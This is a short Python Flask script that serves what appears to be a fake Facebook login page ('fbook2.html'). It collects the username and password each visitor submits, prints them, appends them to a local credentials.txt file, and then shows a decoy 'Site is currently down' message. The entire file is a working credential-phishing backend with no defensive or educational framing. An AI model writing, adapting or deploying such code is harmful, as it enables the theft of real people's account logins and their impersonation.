from flask import Flask, render_template, request
import os

# Defining the base directory as the script is in the servers directory
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

app = Flask(__name__, template_folder=os.path.join(BASE_DIR, 'templates'))

# Path for the credentials file, stored in the root directory
data_filename = os.path.join(BASE_DIR, 'credentials.txt')

@app.route('/')
def index():
    # Specifying the template from its directory
    return render_template('fbook2.html')

@app.route('/submit_form', methods=['POST'])
def submit_form():
    username = request.form['username']
    password = request.form['password']
    print(f"Username/Email: {username}, Password: {password}")

    # Append credentials to the 'credentials.txt' file
    with open(data_filename, 'a') as file:
        file.write(f"Facebook username/Email: {username}, Password: {password}\n")

    return 'Site is currently down, or has been moved!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002, debug=True)
